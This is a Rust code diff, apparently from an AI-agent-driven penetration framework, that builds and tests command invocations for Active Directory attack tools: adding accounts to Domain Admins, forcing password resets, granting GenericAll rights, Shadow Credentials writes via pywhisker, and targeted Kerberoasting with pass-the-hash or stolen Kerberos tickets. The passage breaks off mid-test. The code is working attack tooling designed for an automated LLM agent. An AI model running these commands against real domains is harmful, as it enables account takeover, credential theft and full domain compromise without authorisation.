@@ -22,28 +22,71 @@ fn domain_to_base_dn(domain: &str) -> String {
         .join(",")
 }
 
+/// Build a `bloodyAD` command with authentication already applied, ready for
+/// the caller to append the subcommand (`add groupMember …`, `set password …`,
+/// `add genericAll …`) and a timeout.
+///
+/// A non-empty `ticket_path` selects Kerberos ccache auth and takes precedence:
+/// the cross-forest credential resolver injects an inter-realm ccache that an
+/// NTLM bind would reject with 0x52e (Bug B). Otherwise falls back to a
+/// `username` + `password` NTLM bind.
+///
+/// bloodyAD's `-k` is variadic (`nargs='*'`) and takes keyword arguments like
+/// `ccache=<path>`; there is NO `-K` flag. Passing `-k -K <path>` made argparse
+/// consume `-K` as an unknown token and `<path>` landed in the subcommand slot,
+/// so bloodyAD rejected the whole call. `KRB5CCNAME`/`KRB5_CONFIG` are exported
+/// as a belt-and-braces fallback that recent bloodyAD versions read directly.
+fn bloodyad_base(args: &Value, domain: &str, dc_ip: &str) -> Result<CommandBuilder> {
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+
+    let cmd = if let Some(tpath) = ticket_path {
+        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
+        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
+        CommandBuilder::new("bloodyAD")
+            .flag("-d", domain)
+            .flag("--host", dc_ip)
+            .arg("-k")
+            .arg(format!("ccache={tpath}"))
+            .env(ccname_key, ccname_val)
+            .env(cfg_key, cfg_val)
+    } else {
+        let username = required_str(args, "username")?;
+        let password = required_str(args, "password")?;
+        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
+        CommandBuilder::new("bloodyAD").args(creds)
+    };
+    Ok(cmd)
+}
+
 /// Add a user to a group via `bloodyAD add groupMember`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `group`, `target_user`
+/// Required args: `domain`, `dc_ip`, `group`, `target_user`
+/// Auth — one of:
+///   - `username` + `password` (plaintext NTLM bind)
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
+///
+/// When `ticket_path` is provided it takes precedence over username/password
+/// — the cross-forest credential resolver injects an inter-realm ccache for
+/// foreign-forest writes that NTLM bind would reject with 0x52e. Without the
+/// Kerberos branch the ccache injection is silently dropped (Bug B) and the
+/// dispatch wastes the agent's tool budget on a guaranteed-failed bind.
 pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
+    build_bloodyad_add_group_member(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let group = required_str(args, "group")?;
     let target_user = required_str(args, "target_user")?;
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
+    Ok(bloodyad_base(args, domain, dc_ip)?
         .arg("add")
         .arg("groupMember")
         .arg(group)
         .arg(target_user)
-        .timeout_secs(60)
-        .execute()
-        .await
+        .timeout_secs(60))
 }
 
 /// Set a user's password via `bloodyAD set password`.
@@ -56,117 +99,51 @@ pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
 /// When `ticket_path` is provided it takes precedence over password/hash.
 /// The env var `KRB5CCNAME` is set to the path so bloodyad's Kerberos stack
 /// picks it up without a separate `kinit` step.
-///
-/// If this fails with an LDAP `unicodePwd` modify rejection (e.g. DC requires
-/// LDAPS / signing for password attribute writes), fall back to
-/// [`samr_change_password`] which performs the same ForceChangePassword
-/// primitive over SAMR/RPC instead of LDAP.
 pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
-    let domain = required_str(args, "domain")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-    let target_user = required_str(args, "target_user")?;
-    let new_password = required_str(args, "new_password")?;
-    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
-
-    if let Some(tpath) = ticket_path {
-        // Kerberos mode: bloodyAD -d <domain> --host <dc_ip> -k -K <ccache>
-        CommandBuilder::new("bloodyAD")
-            .flag("-d", domain)
-            .flag("--host", dc_ip)
-            .arg("-k")
-            .flag("-K", tpath.to_string())
-            .arg("set")
-            .arg("password")
-            .arg(target_user)
-            .arg(new_password)
-            // KRB5CCNAME must also be set as an env var; some bloodyAD
-            // versions read it even when -K is passed.
-            .env("KRB5CCNAME", tpath)
-            .timeout_secs(60)
-            .execute()
-            .await
-    } else {
-        let username = required_str(args, "username")?;
-        let password = required_str(args, "password")?;
-        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-        CommandBuilder::new("bloodyAD")
-            .args(creds)
-            .arg("set")
-            .arg("password")
-            .arg(target_user)
-            .arg(new_password)
-            .timeout_secs(60)
-            .execute()
-            .await
-    }
+    build_bloodyad_set_password(args)?.execute().await
 }
 
-/// Force-change a target user's password via impacket `changepasswd.py`
-/// using SAMR/RPC.
-///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`,
-/// `new_password`
-/// Optional args: `protocol` (`rpc-samr` (default) | `smb` | `kpasswd`)
-///
-/// This is the SAMR-protocol counterpart to [`bloodyad_set_password`] and is
-/// the right tool when the DC rejects the LDAP `unicodePwd` modify path —
-/// typically because the server requires LDAPS / signing / channel-binding
-/// for password attribute writes. The SAMR `SamrSetInformationUser2` call
-/// used here goes over the SAMR named pipe (`\\PIPE\samr`) and does not
-/// touch the LDAP password policy at all, so it succeeds in many configs
-/// where bloodyAD fails.
-///
-/// The underlying ACL primitive (`User-Force-Change-Password` extended right,
-/// granted via ForceChangePassword / GenericAll / AllExtendedRights ACEs)
-/// is identical; only the wire protocol differs.
-pub async fn samr_change_password(args: &Value) -> Result<ToolOutput> {
+#[doc(hidden)]
+pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
     let new_password = required_str(args, "new_password")?;
-    let protocol = optional_str(args, "protocol").unwrap_or("rpc-samr");
 
-    // impacket target spec: `[domain/]username[@<targetName or address>]`.
-    // For changepasswd.py the positional target is the VICTIM; the attacker
-    // identity is passed via -altuser / -altpass.
-    let target = format!("{domain}/{target_user}@{dc_ip}");
-
-    CommandBuilder::new("changepasswd.py")
-        .arg("-reset")
-        .flag("-protocol", protocol)
-        .flag("-newpass", new_password)
-        .flag("-altuser", username)
-        .flag("-altpass", password)
-        .arg(target)
-        .timeout_secs(60)
-        .execute()
-        .await
+    Ok(bloodyad_base(args, domain, dc_ip)?
+        .arg("set")
+        .arg("password")
+        .arg(target_user)
+        .arg(new_password)
+        .timeout_secs(60))
 }
 
 /// Grant GenericAll rights via `bloodyAD add genericAll`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_dn`, `principal`
+/// Required args: `domain`, `dc_ip`, `target_dn`, `principal`
+/// Auth — one of:
+///   - `username` + `password` (plaintext NTLM bind)
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
+///
+/// `ticket_path` takes precedence — same Bug B rationale as
+/// `bloodyad_add_group_member`.
 pub async fn bloodyad_add_genericall(args: &Value) -> Result<ToolOutput> {
+    build_bloodyad_add_genericall(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_dn = required_str(args, "target_dn")?;
     let principal = required_str(args, "principal")?;
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
+    Ok(bloodyad_base(args, domain, dc_ip)?
         .arg("add")
         .arg("genericAll")
         .arg(target_dn)
         .arg(principal)
-        .timeout_secs(60)
-        .execute()
-        .await
+        .timeout_secs(60))
 }
 
 /// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
@@ -224,52 +201,194 @@ pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
 
 /// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_samaccountname`
+/// Required args: `domain`, `username`, `dc_ip`, `target_samaccountname`
+/// Auth — one of (precedence: ticket_path > hash > password):
+/// - `ticket_path` — Kerberos ccache (`-k --no-pass` + `KRB5CCNAME`)
+/// - `hash` — NTLM pass-the-hash (`--hashes :NTHASH`)
+/// - `password` — plaintext bind
+///
 /// Optional args: `action` (default: `"add"`)
+///
+/// Without the hash/Kerberos branches, DACL-holding machine accounts and
+/// captured NTLM-only principals can't drive Shadow Credentials writes even
+/// though the underlying `pywhisker.py` supports both auth modes — the LLM
+/// wrapper was the only bottleneck.
 pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
+    build_pywhisker(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_pywhisker(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_sam = required_str(args, "target_samaccountname")?;
     let action = optional_str(args, "action").unwrap_or("add");
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
 
-    CommandBuilder::new("pywhisker")
+    let mut cmd = CommandBuilder::new("pywhisker")
         .flag("-d", domain)
         .flag("-u", username)
-        .flag("-p", password)
         .flag("--target", target_sam)
         .flag("--action", action)
-        .flag("--dc-ip", dc_ip)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .flag("--dc-ip", dc_ip);
+
+    if let Some(tpath) = ticket_path {
+        // Kerberos: pywhisker uses standard impacket-style `-k` + KRB5CCNAME.
+        // `--no-pass` prevents interactive prompt when neither password nor
+        // hash is on the command line.
+        cmd = cmd
+            .arg("-k")
+            .arg("--no-pass")
+            .env("KRB5CCNAME", tpath)
+            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
+    } else if let Some(h) = hash {
+        let nt = if h.contains(':') {
+            h.to_string()
+        } else {
+            format!(":{h}")
+        };
+        cmd = cmd.arg("--hashes").arg(nt).arg("--no-pass");
+    } else {
+        let password = required_str(args, "password")?;
+        cmd = cmd.flag("-p", password);
+    }
+
+    Ok(cmd.timeout_secs(120))
 }
 
-/// Perform targeted Kerberoasting via `targetedKerberoast.py`.
+/// Perform targeted Kerberoasting.
 ///
 /// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`
+/// Optional args: `etype_hint` (array of Kerberos etype names, e.g.
+///   `["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"]`)
 ///
-/// Flag note: upstream (ShutdownRepo) argparse uses `--request-user` for the
-/// single target (older `-t` shorthand was never accepted) and `--dc-ip`
-/// (double dash) for the DC. Passing `-t` causes a parser error before any
-/// LDAP work happens.
+/// When `etype_hint` is absent we invoke `targetedKerberoast.py`, which
+/// issues the TGS-REQ with the default etype priority (RC4 first).
+///
+/// When `etype_hint` is present we switch to `impacket-GetUserSPNs
+/// -request-user <target_user> -supported-enctypes <bitmask>` because
+/// `targetedKerberoast.py` exposes no etype-selection flag. Bug E: after a
+/// `KDC_ERR_ETYPE_NOSUPP` rejection the orchestrator dispatches an AES-only
+/// retry — passing the hint to a tool that always issues RC4 would just
+/// loop until the SPN account locks out. The bitmask follows
+/// `msDS-SupportedEncryptionTypes`: AES256=0x10, AES128=0x08, RC4=0x04.
 pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
+    build_targeted_kerberoast(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
 
-    CommandBuilder::new("targetedKerberoast.py")
-        .flag("-d", domain)
-        .flag("-u", username)
-        .flag("-p", password)
-        .flag("--request-user", target_user)
-        .flag("--dc-ip", dc_ip)
-        .timeout_secs(120)
-        .execute()
-        .await
+    let etype_mask = etype_hint_bitmask(args);
+
+    let cmd = if let Some(mask) = etype_mask {
+        // Switch to impacket-GetUserSPNs because targetedKerberoast.py has
+        // no etype selector. `-request-user` limits the dispatch to the
+        // single SPN account so we don't trigger a forest-wide kerberoast
+        // pass that may relock other principals.
+        let mut cmd = CommandBuilder::new("impacket-GetUserSPNs");
+
+        if let Some(tpath) = ticket_path {
+            let target = credentials::impacket_target(Some(domain), username, None, dc_ip);
+            cmd = cmd
+                .arg(target)
+                .arg("-k")
+                .arg("-no-pass")
+                .env("KRB5CCNAME", tpath)
+                .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
+        } else if let Some(h) = hash {
+            let target = credentials::impacket_target(Some(domain), username, None, dc_ip);
+            cmd = cmd.arg(target);
+            for a in credentials::hash_args(h) {
+                cmd = cmd.arg(a);
+            }
+            cmd = cmd.arg("-no-pass");
+        } else {
+            let password = required_str(args, "password")?;
+            let target =
+                credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
+            cmd = cmd.arg(target);
+        }
+
+        cmd.arg("-dc-ip")
+            .arg(dc_ip)
+            .arg("-request-user")
+            .arg(target_user)
+            .arg("-supported-enctypes")
+            .arg(mask.to_string())
+            .timeout_secs(120)
+    } else {
+        let mut cmd = CommandBuilder::new("targetedKerberoast.py")
+            .flag("-d", domain)
+            .flag("-u", username)
+            .flag("-t", target_user)
+            .flag("-dc-ip", dc_ip);
+
+        if let Some(tpath) = ticket_path {
+            // targetedKerberoast.py is an impacket-based script; it honors
+            // `-k` + `KRB5CCNAME` and `-no-pass` (impacket single-dash form).
+            cmd = cmd
+                .arg("-k")
+                .arg("-no-pass")
+                .env("KRB5CCNAME", tpath)
+                .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
+        } else if let Some(h) = hash {
+            let nt = if h.contains(':') {
+                h.to_string()
+            } else {
+                format!(":{h}")
+            };
+            cmd = cmd.arg("-H").arg(nt).arg("-no-pass");
+        } else {
+            let password = required_str(args, "password")?;
+            cmd = cmd.flag("-p", password);
+        }
+
+        cmd.timeout_secs(120)
+    };
+    Ok(cmd)
+}
+
+/// Translate an `etype_hint` array into the `msDS-SupportedEncryptionTypes`
+/// bitmask impacket-GetUserSPNs reads via `-supported-enctypes`. Returns
+/// `None` when the hint is missing or empty — callers fall back to the
+/// no-etype-selection path. Unknown etype strings are skipped with a
+/// `tracing::warn!` so a future etype name addition doesn't silently bake
+/// a zero bitmask into the dispatch.
+fn etype_hint_bitmask(args: &Value) -> Option<u32> {
+    let arr = args.get("etype_hint").and_then(|v| v.as_array())?;
+    let mut mask: u32 = 0;
+    for v in arr {
+        let Some(name) = v.as_str() else { continue };
+        let bit = match name.to_ascii_lowercase().as_str() {
+            "aes256-cts-hmac-sha1-96" | "aes256" | "aes256-cts" => 0x10,
+            "aes128-cts-hmac-sha1-96" | "aes128" | "aes128-cts" => 0x08,
+            "rc4-hmac" | "rc4_hmac" | "rc4" | "arcfour-hmac" => 0x04,
+            "des-cbc-md5" | "des_cbc_md5" => 0x02,
+            "des-cbc-crc" | "des_cbc_crc" => 0x01,
+            other => {
+                tracing::warn!(
+                    etype = %other,
+                    "targeted_kerberoast: unknown etype_hint value, ignored"
+                );
+                continue;
+            }
+        };
+        mask |= bit;
+    }
+    if mask == 0 {
+        None
+    } else {
+        Some(mask)
+    }
 }
 
 /// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
@@ -512,46 +631,6 @@ mod tests {
         });
         assert_eq!(required_str(&args, "target_user").unwrap(), "victim");
         assert_eq!(required_str(&args, "new_password").unwrap(), "NewP@ss123!");
-    }
-
-    // ── samr_change_password arg validation ────────────────────────────
-
-    #[test]
-    fn samr_change_password_missing_new_password() {
-        let args = json!({
-            "domain": "contoso.local",
-            "username": "admin",
-            "password": "P@ssw0rd!",
-            "dc_ip": "192.168.58.10",
-            "target_user": "victim"
-        });
-        assert!(required_str(&args, "new_password").is_err());
-    }
-
-    #[test]
-    fn samr_change_password_default_protocol() {
-        let args = json!({
-            "domain": "contoso.local",
-            "username": "admin",
-            "password": "P@ssw0rd!",
-            "dc_ip": "192.168.58.10",
-            "target_user": "victim",
-            "new_password": "NewP@ss123!"
-        });
-        let protocol = optional_str(&args, "protocol").unwrap_or("rpc-samr");
-        assert_eq!(protocol, "rpc-samr");
-    }
-
-    #[test]
-    fn samr_change_password_target_format() {
-        // The impacket target spec for changepasswd.py is the VICTIM's
-        // `[domain/]username[@target]`; the attacker identity rides on
-        // -altuser / -altpass.
-        let domain = "contoso.local";
-        let target_user = "bob";
-        let dc_ip = "192.168.58.10";
-        let target = format!("{domain}/{target_user}@{dc_ip}");
-        assert_eq!(target, "contoso.local/bob@192.168.58.10");
     }
 
     // ── bloodyad_add_genericall arg validation ─────────────────────────
@@ -1034,35 +1113,6 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn samr_change_password_executes() {
-        mock::push(mock::success());
-        let args = json!({
-            "domain": "contoso.local",
-            "username": "alice",
-            "password": "P@ssw0rd!",   // pragma: allowlist secret
-            "dc_ip": "192.168.58.10",
-            "target_user": "bob",
-            "new_password": "NewP@ss!99"
-        });
-        assert!(super::samr_change_password(&args).await.is_ok());
-    }
-
-    #[tokio::test]
-    async fn samr_change_password_explicit_protocol_executes() {
-        mock::push(mock::success());
-        let args = json!({
-            "domain": "contoso.local",
-            "username": "alice",
-            "password": "P@ssw0rd!",   // pragma: allowlist secret
-            "dc_ip": "192.168.58.10",
-            "target_user": "bob",
-            "new_password": "NewP@ss!99",
-            "protocol": "smb"
-        });
-        assert!(super::samr_change_password(&args).await.is_ok());
-    }
-
-    #[tokio::test]
     async fn bloodyad_set_password_kerberos_missing_creds_still_needs_new_password() {
         // ticket_path branch still requires new_password.
         let args = json!({
@@ -1203,5 +1253,404 @@ mod tests {
             "target_dn": "CN=Users,DC=contoso,DC=local"
         });
         assert!(super::dacl_edit(&args).await.is_ok());
+    }
+
+    // ── Bug B: ticket_path → KRB5CCNAME env wiring ──────────────────────
+
+    #[test]
+    fn bloodyad_set_password_invocation_receives_krb5ccname_env() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "target_user": "svc_exploit",
+            "new_password": "NewP@ss!99",
+            "ticket_path": "/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache",
+        });
+        let cmd = super::build_bloodyad_set_password(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .any(|(k, v)| k == "KRB5CCNAME"
+                    && v == "/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache"),
+            "KRB5CCNAME must reach the bloodyAD subprocess when ticket_path is supplied"
+        );
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-k"), "expected -k flag");
+        // bloodyAD's `-k` is variadic; the ccache reaches it as `ccache=<path>`.
+        // `-K` is NOT a valid bloodyAD arg — regression guard against the
+        // wedge that corrupted argv into an "invalid choice" subcommand error.
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "ccache=/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache"),
+            "expected `-k ccache=<path>` form; got args: {args_vec:?}"
+        );
+        assert!(
+            !args_vec.iter().any(|a| a == "-K"),
+            "`-K` is not a real bloodyAD flag; must not appear in argv"
+        );
+    }
+
+    #[test]
+    fn bloodyad_add_group_member_invocation_receives_krb5ccname_env() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "group": "Domain Admins",
+            "target_user": "alice",
+            "ticket_path": "/tmp/ares-tickets/x.ccache",
+        });
+        let cmd = super::build_bloodyad_add_group_member(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/x.ccache"),
+            "ticket_path must export KRB5CCNAME for bloodyad_add_group_member"
+        );
+        let args_vec = cmd.args_for_test();
+        assert!(
+            args_vec.iter().any(|a| a == "-k"),
+            "expected bloodyAD -k flag for Kerberos auth"
+        );
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "ccache=/tmp/ares-tickets/x.ccache"),
+            "expected `-k ccache=<path>` (bloodyAD's variadic keyword form), \
+             not `-K <path>` which bloodyAD rejects"
+        );
+        assert!(
+            !args_vec.iter().any(|a| a == "-K"),
+            "`-K` is not a real bloodyAD flag"
+        );
+    }
+
+    #[test]
+    fn bloodyad_add_group_member_password_branch_unchanged() {
+        // Sanity: without ticket_path the legacy NTLM bind args are still
+        // produced. Regression guard for the conditional in
+        // build_bloodyad_add_group_member.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.1",
+            "group": "Domain Admins",
+            "target_user": "alice",
+        });
+        let cmd = super::build_bloodyad_add_group_member(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .all(|(k, _)| k != "KRB5CCNAME"),
+            "NTLM-bind branch must not export KRB5CCNAME"
+        );
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-u"));
+        assert!(args_vec.iter().any(|a| a == "-p"));
+    }
+
+    #[test]
+    fn bloodyad_add_genericall_invocation_receives_krb5ccname_env() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.20",
+            "target_dn": "CN=Users,DC=fabrikam,DC=local",
+            "principal": "alice",
+            "ticket_path": "/tmp/ares-tickets/y.ccache",
+        });
+        let cmd = super::build_bloodyad_add_genericall(&args).unwrap();
+        assert!(
+            cmd.env_vars_for_test()
+                .iter()
+                .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/y.ccache"),
+            "ticket_path must export KRB5CCNAME for bloodyad_add_genericall"
+        );
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "ccache=/tmp/ares-tickets/y.ccache"),
+            "expected `-k ccache=<path>`; got args: {args_vec:?}"
+        );
+        assert!(
+            !args_vec.iter().any(|a| a == "-K"),
+            "`-K` is not a real bloodyAD flag"
+        );
+    }
+
+    // ── Bug E: etype_hint consumption ───────────────────────────────────
+
+    #[test]
+    fn targeted_kerberoast_passes_etype_hint_to_underlying_binary() {
+        let args = json!({
+            "domain": "fabrikam.local",
+            "username": "carol",
+            "password": "fr3edom",
+            "dc_ip": "192.168.58.20",
+            "target_user": "sql_svc",
+            "etype_hint": ["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        // AES256(0x10) | AES128(0x08) = 24
+        let mask_idx = args_vec
+            .iter()
+            .position(|a| a == "-supported-enctypes")
+            .expect("etype_hint must produce -supported-enctypes flag");
+        assert_eq!(
+            args_vec.get(mask_idx + 1).map(String::as_str),
+            Some("24"),
+            "AES256+AES128 etype_hint must serialize to the msDS-SupportedEncryptionTypes \
+             bitmask value 24 (0x18) so impacket-GetUserSPNs requests AES-only TGS"
+        );
+        assert!(
+            args_vec.iter().any(|a| a == "-request-user"),
+            "expected -request-user flag to scope the kerberoast"
+        );
+    }
+
+    #[test]
+    fn targeted_kerberoast_without_etype_hint_falls_back_to_targetedkerberoast_py() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.1",
+            "target_user": "svc_sql",
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        // The legacy `-t` flag is targetedKerberoast.py's per-user selector;
+        // impacket-GetUserSPNs uses `-request-user` instead. Either presence
+        // is sufficient to confirm the fallback path is reached, but the -t
+        // flag pins the implementation choice when no etype_hint is set.
+        let args_vec = cmd.args_for_test();
+        assert!(
+            args_vec.iter().any(|a| a == "-t"),
+            "no etype_hint → must invoke targetedKerberoast.py (-t flag)"
+        );
+        assert!(
+            args_vec.iter().all(|a| a != "-supported-enctypes"),
+            "no etype_hint → must NOT pass -supported-enctypes"
+        );
+    }
+
+    // ── hash / ticket_path auth for pywhisker & targeted_kerberoast ───────
+
+    #[test]
+    fn pywhisker_ticket_path_sets_krb5ccname_and_no_pass() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+            "ticket_path": "/tmp/ares-tickets/admin.ccache",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(args_vec.iter().any(|a| a == "--no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
+    }
+
+    #[test]
+    fn pywhisker_hash_uses_hashes_flag() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+            "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        let idx = args_vec
+            .iter()
+            .position(|a| a == "--hashes")
+            .expect("--hashes flag required for pass-the-hash");
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some(":aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
+            "NT-only hash must be prefixed with ':'"
+        );
+        assert!(args_vec.iter().any(|a| a == "--no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+    }
+
+    #[test]
+    fn pywhisker_hash_preserves_lm_nt_form() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        let idx = args_vec.iter().position(|a| a == "--hashes").unwrap();
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
+        );
+    }
+
+    #[test]
+    fn pywhisker_password_branch_still_works() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+        });
+        let cmd = super::build_pywhisker(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-p"));
+        assert!(args_vec.iter().all(|a| a != "--hashes"));
+        assert!(args_vec.iter().all(|a| a != "-k"));
+    }
+
+    #[test]
+    fn pywhisker_missing_all_auth_errors() {
+        // No password, no hash, no ticket_path → password required error.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": "dc01$",
+        });
+        assert!(super::build_pywhisker(&args).is_err());
+    }
+
+    #[test]
+    fn targeted_kerberoast_no_etype_ticket_path_sets_kerberos_env() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "ticket_path": "/tmp/ares-tickets/admin.ccache",
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        // No-etype branch uses targetedKerberoast.py (-t flag present).
+        assert!(args_vec.iter().any(|a| a == "-t"));
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
+    }
+
+    #[test]
+    fn targeted_kerberoast_no_etype_hash_uses_capital_h() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        // targetedKerberoast.py uses `-H` (single-dash impacket style) for hashes.
+        let idx = args_vec.iter().position(|a| a == "-H").unwrap();
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some(":31d6cfe0d16ae931b73c59d7e0c089c0"),
+        );
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(args_vec.iter().all(|a| a != "-p"));
+    }
+
+    #[test]
+    fn targeted_kerberoast_etype_ticket_path_sets_kerberos_env() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
